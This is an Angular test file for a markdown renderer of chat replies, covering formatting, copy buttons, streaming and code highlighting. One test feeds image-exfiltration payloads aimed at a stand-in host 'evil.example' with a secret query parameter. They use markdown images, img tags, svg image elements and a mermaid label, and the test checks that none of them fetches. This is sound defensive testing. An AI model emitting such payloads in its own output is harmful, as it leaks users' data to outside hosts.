import { Clipboard } from '@angular/cdk/clipboard';
import { ChangeDetectionStrategy, Component, signal } from '@angular/core';
import { TestBed } from '@angular/core/testing';

import { expectAccessible } from '../../testing/axe';
import { GlzMarkdownComponent } from './markdown.component';

@Component({
  imports: [GlzMarkdownComponent],
  changeDetection: ChangeDetectionStrategy.OnPush,
  template: `<div testId="md" [glzMarkdown]="text()" [streaming]="streaming()"></div>`,
})
class HostComponent {
  readonly text = signal('');
  readonly streaming = signal(false);
}

const REMOTE = 'https://evil.example/p.png?secret=ab12';

const REPLY = [
  '# They pass now',
  '',
  'The **parser** returned a value for `""`; see [the guide](https://example.com/guide).',
  '',
  '- [x] Fix it',
  '- [ ] Document it',
  '',
  '| Case | After |',
  '| :--- | ----: |',
  '| empty | `None` |',
  '',
  '```rust',
  'fn parse(input: &str) -> Option<Value> {',
  '    input.parse().ok()',
  '}',
  '```',
].join('\n');

async function render(
  text: string,
  streaming = false,
): Promise<{
  readonly root: HTMLElement;
  readonly host: HostComponent;
  readonly stable: () => Promise<unknown>;
}> {
  const fixture = TestBed.createComponent(HostComponent);
  fixture.componentInstance.text.set(text);
  fixture.componentInstance.streaming.set(streaming);
  await fixture.whenStable();
  return {
    root: fixture.nativeElement as HTMLElement,
    host: fixture.componentInstance,
    stable: () => fixture.whenStable(),
  };
}

describe('GlzMarkdownComponent', () => {
  afterEach(() => {
    vi.restoreAllMocks();
  });

  it('renders a reply’s markdown in its element, which Angular’s sanitizer leaves whole', async () => {
    const warn = vi.spyOn(console, 'warn');
    const { root } = await render(REPLY);
    const markdown = root.querySelector('[data-testid="md"]');
    expect(markdown?.classList).toContain('glz-markdown');
    expect(markdown?.querySelector('h1')?.textContent).toBe('They pass now');
    expect(markdown?.querySelector('strong')?.textContent).toBe('parser');
    expect(markdown?.querySelectorAll('.glz-markdown-task')).toHaveLength(2);
    expect(markdown?.querySelector('td[align="right"] code')?.textContent).toBe('None');
    const link = markdown?.querySelector('a');
    expect(link?.getAttribute('target')).toBe('_blank');
    expect(link?.getAttribute('rel')).toBe('noopener noreferrer');
    // Nothing the renderer wrote was stripped on the way in.
    expect(warn).not.toHaveBeenCalled();
    await expectAccessible(root);
  });

  it('never makes an element that fetches, sanitized or not', async () => {
    const { root } = await render(
      [
        `![chart](${REMOTE})`,
        `![ref][r]\n\n[r]: ${REMOTE}`,
        `<img src="${REMOTE}">`,
        `<svg><image href="${REMOTE}"/></svg>`,
        `\`\`\`mermaid\ngraph TD\n  A["<img src='${REMOTE}'>"]\n\`\`\``,
      ].join('\n\n'),
    );
    expect(
      root.querySelector('img, image, svg:not(glz-copy-button svg), [src], [srcset]'),
    ).toBeNull();
    const images = Array.from(root.querySelectorAll('a.glz-markdown-image'), (a) => a.textContent);
    expect(images).toEqual([
      'Image: chart (opens in a new tab)',
      'Image: ref (opens in a new tab)',
    ]);
  });

  it('gives each code block a copy button that copies its code', async () => {
    const copy = vi.fn(() => true);
    TestBed.configureTestingModule({ providers: [{ provide: Clipboard, useValue: { copy } }] });
    const { root, stable } = await render(REPLY);
    const button = root.querySelector<HTMLButtonElement>('[data-testid="md-copy"]');
    expect(button?.getAttribute('aria-label')).toBe('Copy code');
    button?.click();
    await stable();
    expect(copy).toHaveBeenCalledWith(
      'fn parse(input: &str) -> Option<Value> {\n    input.parse().ok()\n}',
    );
    expect(button?.getAttribute('aria-label')).toBe('Copied');
  });

  it('streams block by block: finished blocks and their buttons stay, the last one grows', async () => {
    // Plain text, so no highlighting arrives to redo every block.
    const { root, host, stable } = await render('```text\ncargo test\n```\n\nThe **pars', true);
    const code = root.querySelector('.glz-markdown-code');
    const button = root.querySelector('[data-testid="md-copy"]');
    expect(root.querySelector('p strong')?.textContent).toBe('pars');
    expect(root.textContent).not.toContain('**');
    host.text.set('```text\ncargo test\n```\n\nThe **parser** passes');
    await stable();
    expect(root.querySelector('.glz-markdown-code')).toBe(code);
    expect(root.querySelector('[data-testid="md-copy"]')).toBe(button);
    expect(root.querySelector('p')?.textContent).toBe('The parser passes');
    host.streaming.set(false);
    await stable();
    expect(root.querySelector('.glz-markdown-code')).toBe(code);
    expect(root.querySelectorAll('[data-testid="md-copy"]')).toHaveLength(1);
  });

  it('highlights code once its language has loaded', async () => {
    const { root, stable } = await render(REPLY);
    await vi.waitFor(async () => {
      await stable();
      expect(root.querySelector('.language-rust .hljs-keyword')?.textContent).toBe('fn');
    });
    expect(root.querySelectorAll('[data-testid="md-copy"]')).toHaveLength(1);
    await expectAccessible(root);
  });
});
